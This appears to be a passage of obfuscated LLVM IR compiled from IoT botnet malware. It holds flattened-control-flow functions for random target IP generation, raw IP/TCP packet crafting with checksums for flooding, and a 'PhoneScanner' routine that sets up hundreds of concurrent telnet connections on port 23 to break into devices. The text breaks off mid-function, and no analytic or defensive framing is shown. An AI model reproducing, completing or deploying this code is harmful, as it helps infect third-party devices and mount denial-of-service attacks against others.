  %1258 = call i32 (i8*, i8*, ...) @szprintf(i8* %1253, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.297, i32 0, i32 0), i32 %1255, i32 %1257)
  store i32 -913910694, i32* %switchVar
  br label %loopEnd

; <label>:1259:                                   ; preds = %loopEntry
  %1260 = load i32, i32* %1, align 4
  %1261 = icmp eq i32 %1260, 113
  %1262 = select i1 %1261, i32 1484760431, i32 -1954089727
  store i32 %1262, i32* %switchVar
  br label %loopEnd

; <label>:1263:                                   ; preds = %loopEntry
  %1264 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1265 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1266 = zext i8 %1265 to i32
  %1267 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1268 = zext i8 %1267 to i32
  %1269 = call i32 (i8*, i8*, ...) @szprintf(i8* %1264, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.298, i32 0, i32 0), i32 %1266, i32 %1268)
  store i32 -1954089727, i32* %switchVar
  br label %loopEnd

; <label>:1270:                                   ; preds = %loopEntry
  %1271 = load i32, i32* %1, align 4
  %1272 = icmp eq i32 %1271, 114
  %1273 = select i1 %1272, i32 -1972444250, i32 1558500327
  store i32 %1273, i32* %switchVar
  br label %loopEnd

; <label>:1274:                                   ; preds = %loopEntry
  %1275 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1276 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1277 = zext i8 %1276 to i32
  %1278 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1279 = zext i8 %1278 to i32
  %1280 = call i32 (i8*, i8*, ...) @szprintf(i8* %1275, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.299, i32 0, i32 0), i32 %1277, i32 %1279)
  store i32 1558500327, i32* %switchVar
  br label %loopEnd

; <label>:1281:                                   ; preds = %loopEntry
  %1282 = load i32, i32* %1, align 4
  %1283 = icmp eq i32 %1282, 115
  %1284 = select i1 %1283, i32 1753748993, i32 -445952870
  store i32 %1284, i32* %switchVar
  br label %loopEnd

; <label>:1285:                                   ; preds = %loopEntry
  %1286 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1287 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1288 = zext i8 %1287 to i32
  %1289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1290 = zext i8 %1289 to i32
  %1291 = call i32 (i8*, i8*, ...) @szprintf(i8* %1286, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.300, i32 0, i32 0), i32 %1288, i32 %1290)
  store i32 -445952870, i32* %switchVar
  br label %loopEnd

; <label>:1292:                                   ; preds = %loopEntry
  %1293 = load i32, i32* %1, align 4
  %1294 = icmp eq i32 %1293, 116
  %1295 = select i1 %1294, i32 -1075953749, i32 -965169359
  store i32 %1295, i32* %switchVar
  br label %loopEnd

; <label>:1296:                                   ; preds = %loopEntry
  %1297 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1298 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1299 = zext i8 %1298 to i32
  %1300 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1301 = zext i8 %1300 to i32
  %1302 = call i32 (i8*, i8*, ...) @szprintf(i8* %1297, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.301, i32 0, i32 0), i32 %1299, i32 %1301)
  store i32 -965169359, i32* %switchVar
  br label %loopEnd

; <label>:1303:                                   ; preds = %loopEntry
  %1304 = load i32, i32* %1, align 4
  %1305 = icmp eq i32 %1304, 117
  %1306 = select i1 %1305, i32 -1370656296, i32 1012545021
  store i32 %1306, i32* %switchVar
  br label %loopEnd

; <label>:1307:                                   ; preds = %loopEntry
  %1308 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1310 = zext i8 %1309 to i32
  %1311 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1312 = zext i8 %1311 to i32
  %1313 = call i32 (i8*, i8*, ...) @szprintf(i8* %1308, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.302, i32 0, i32 0), i32 %1310, i32 %1312)
  store i32 1012545021, i32* %switchVar
  br label %loopEnd

; <label>:1314:                                   ; preds = %loopEntry
  %1315 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1316 = call i32 @inet_addr(i8* %1315) #5
  ret i32 %1316

loopEnd:                                          ; preds = %1307, %1303, %1296, %1292, %1285, %1281, %1274, %1270, %1263, %1259, %1252, %1248, %1241, %1237, %1230, %1226, %1219, %1215, %1208, %1204, %1197, %1193, %1186, %1182, %1175, %1171, %1164, %1160, %1153, %1149, %1142, %1138, %1131, %1127, %1120, %1116, %1109, %1105, %1098, %1094, %1087, %1083, %1076, %1072, %1065, %1061, %1054, %1050, %1043, %1039, %1032, %1028, %1021, %1017, %1010, %1006, %999, %995, %988, %984, %977, %973, %966, %962, %955, %951, %944, %940, %933, %929, %922, %918, %911, %907, %900, %896, %889, %885, %878, %874, %867, %863, %856, %852, %845, %841, %834, %830, %823, %819, %812, %808, %801, %797, %790, %786, %779, %775, %768, %764, %757, %753, %746, %742, %735, %731, %724, %720, %713, %709, %702, %698, %691, %687, %680, %676, %669, %665, %658, %654, %647, %643, %636, %632, %625, %621, %614, %610, %603, %599, %592, %588, %581, %577, %570, %566, %559, %555, %548, %544, %537, %533, %526, %522, %515, %511, %504, %500, %493, %489, %482, %478, %471, %467, %460, %456, %449, %445, %438, %434, %427, %423, %416, %412, %405, %401, %394, %390, %383, %379, %372, %368, %361, %357, %350, %346, %339, %335, %328, %324, %317, %313, %306, %302, %295, %291, %284, %280, %273, %269, %262, %258, %251, %247, %240, %236, %229, %225, %218, %214, %207, %203, %196, %192, %185, %181, %174, %170, %163, %159, %152, %148, %141, %137, %130, %126, %119, %115, %108, %104, %97, %93, %86, %82, %75, %71, %64, %60, %53, %49, %42, %38, %31, %27, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 956227842, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 956227842, label %6
    i32 -686889339, label %10
    i32 -1167083602, label %19
    i32 488909941, label %23
    i32 48367355, label %30
    i32 864521435, label %31
    i32 139637505, label %36
    i32 -1665654360, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -686889339, i32 -1167083602
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 956227842, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 488909941, i32 48367355
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 48367355, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 864521435, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 139637505, i32 -1665654360
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 864521435, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1017630657, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1017630657, label %first
    i32 -836920262, label %7
    i32 265873518, label %8
    i32 1967037196, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 -836920262, i32 265873518
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 1967037196, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 1967037196, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @PhoneScanner() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [128 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i32, align 4
  %12 = alloca [256 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 512, i32* %1, align 4
  %19 = load i32, i32* %1, align 4
  store i32 %19, i32* %6, align 4
  %20 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %21 = call i32 @rand_cmwc()
  %22 = xor i32 %20, %21
  call void @srand(i32 %22) #5
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %27 = getelementptr inbounds [8 x i8], [8 x i8]* %26, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 8, i32 4, i1 false)
  %28 = call noalias i8* @malloc(i64 513) #5
  store i8* %28, i8** %13, align 8
  %29 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 513, i32 1, i1 false)
  %30 = load i32, i32* %6, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %15, align 8
  %33 = alloca %struct.telstate_t, i64 %31, align 16
  %34 = bitcast %struct.telstate_t* %33 to i8*
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 %37, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  %switchVar = alloca i32
  store i32 817927514, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar21 = load i32, i32* %switchVar
  switch i32 %switchVar21, label %switchDefault [
    i32 817927514, label %38
    i32 -1561421924, label %43
    i32 551926964, label %57
    i32 -1910903110, label %60
    i32 2055106136, label %61
    i32 -1364425364, label %62
    i32 -2123187885, label %63
    i32 -355420716, label %68
    i32 632674217, label %76
    i32 719415360, label %82
    i32 -1406466983, label %NodeBlock19
    i32 -2024651662, label %NodeBlock17
    i32 -769404266, label %NodeBlock15
    i32 -602142481, label %NodeBlock13
    i32 -151953095, label %LeafBlock11
    i32 145965234, label %NodeBlock9
    i32 689548031, label %NodeBlock7
    i32 -2086940056, label %NodeBlock5
    i32 1685964967, label %NodeBlock3
    i32 -2101958041, label %NodeBlock1
    i32 683977935, label %NodeBlock
    i32 -1131223166, label %LeafBlock
    i32 657637744, label %101
    i32 262765329, label %110
    i32 -1013606877, label %130
    i32 751804811, label %155
    i32 -2077045609, label %156
    i32 -583749265, label %179
    i32 -1428971577, label %184
    i32 -1008033519, label %195
    i32 -1901787428, label %204
    i32 -2055954353, label %205
    i32 -83512326, label %206
    i32 -1032660899, label %215
    i32 -835864942, label %216
    i32 -1164012657, label %248
    i32 -650326822, label %259
    i32 74247854, label %274
    i32 -1220744435, label %305
    i32 2139365212, label %306
    i32 -1745248890, label %310
    i32 -483344678, label %325
    i32 -769184313, label %326
    i32 2021124846, label %336
    i32 1295424851, label %351
    i32 22904217, label %352
    i32 -1790969529, label %366
    i32 1483293000, label %375
    i32 217750618, label %380
    i32 1293514272, label %385
    i32 -602403282, label %386
    i32 -809614537, label %396
    i32 1246782375, label %405
    i32 -836418229, label %406
    i32 728085230, label %415
    i32 117276689, label %424
    i32 825873561, label %429
    i32 1693447444, label %443
    i32 -592097680, label %452
    i32 1234463951, label %457
    i32 -1597126261, label %462
    i32 -513412499, label %463
    i32 1648499259, label %473
    i32 314951247, label %482
    i32 12665688, label %483
    i32 1032440875, label %492
    i32 -1874910161, label %501
    i32 -1970858921, label %506
    i32 1044108813, label %520
    i32 1178308357, label %534
    i32 -335289396, label %539
    i32 -900621277, label %550
    i32 -1037576025, label %551
    i32 2085133443, label %561
    i32 -764359075, label %570
    i32 1576239310, label %571
    i32 818743611, label %580
    i32 673617614, label %589
    i32 1780622152, label %594
    i32 -406367482, label %608
    i32 -609259397, label %617
    i32 -1264234469, label %622
    i32 1230625980, label %627
    i32 -877306323, label %628
    i32 80171499, label %638
    i32 654502418, label %647
    i32 412898049, label %648
    i32 1513184323, label %657
    i32 1291519590, label %666
    i32 -127662603, label %671
    i32 -1435563706, label %688
    i32 404704917, label %703
    i32 -1513044218, label %717
    i32 1031687452, label %726
    i32 94985865, label %727
    i32 950878214, label %736
    i32 2079401573, label %NewDefault
    i32 387971381, label %737
    i32 761967062, label %738
    i32 1016973950, label %741
    i32 -1289801174, label %742
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %6, align 4
  %41 = icmp slt i32 %39, %40
  %42 = select i1 %41, i32 -1561421924, i32 -1910903110
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %2, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %45
  %47 = bitcast %struct.telstate_t* %46 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 32, i32 16, i1 false)
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 3
  store i8 1, i8* %51, align 1
  %52 = load i8*, i8** %13, align 8
  %53 = load i32, i32* %2, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %54
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %55, i32 0, i32 9
  store i8* %52, i8** %56, align 8
  store i32 551926964, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  store i32 817927514, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 2055106136, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1364425364, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -2123187885, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %2, align 4
  %65 = load i32, i32* %6, align 4
  %66 = icmp slt i32 %64, %65
  %67 = select i1 %66, i32 -355420716, i32 1016973950
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %2, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %70
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %71, i32 0, i32 7
  %73 = load i32, i32* %72, align 16
  %74 = icmp eq i32 %73, 0
  %75 = select i1 %74, i32 632674217, i32 719415360
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %78 = load i32, i32* %2, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 7
  store i32 %77, i32* %81, align 16
  store i32 719415360, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %2, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 2
  %87 = load i8, i8* %86, align 8
  %88 = zext i8 %87 to i32
  store i32 %88, i32* %.reg2mem
  store i32 -1406466983, i32* %switchVar
  br label %loopEnd

NodeBlock19:                                      ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem
  %Pivot20 = icmp slt i32 %.reload32, 5
  %89 = select i1 %Pivot20, i32 -2086940056, i32 -2024651662
  store i32 %89, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload26 = load volatile i32, i32* %.reg2mem
  %Pivot18 = icmp slt i32 %.reload26, 8
  %90 = select i1 %Pivot18, i32 145965234, i32 -769404266
  store i32 %90, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem
  %Pivot16 = icmp slt i32 %.reload23, 9
  %91 = select i1 %Pivot16, i32 1780622152, i32 -602142481
  store i32 %91, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem
  %Pivot14 = icmp slt i32 %.reload22, 10
  %92 = select i1 %Pivot14, i32 412898049, i32 -151953095
  store i32 %92, i32* %switchVar
  br label %loopEnd

LeafBlock11:                                      ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf12 = icmp eq i32 %.reload, 10
  %93 = select i1 %SwitchLeaf12, i32 -127662603, i32 2079401573
  store i32 %93, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload25 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload25, 6
  %94 = select i1 %Pivot10, i32 12665688, i32 689548031
  store i32 %94, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload24 = load volatile i32, i32* %.reg2mem
  %Pivot8 = icmp slt i32 %.reload24, 7
  %95 = select i1 %Pivot8, i32 -1970858921, i32 1576239310
  store i32 %95, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload31, 2
  %96 = select i1 %Pivot6, i32 683977935, i32 1685964967
  store i32 %96, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem
  %Pivot4 = icmp slt i32 %.reload28, 3
  %97 = select i1 %Pivot4, i32 22904217, i32 -2101958041
  store i32 %97, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload27 = load volatile i32, i32* %.reg2mem
  %Pivot2 = icmp slt i32 %.reload27, 4
  %98 = select i1 %Pivot2, i32 -836418229, i32 825873561
  store i32 %98, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload30, 1
  %99 = select i1 %Pivot, i32 -1131223166, i32 -2055954353
  store i32 %99, i32* %switchVar
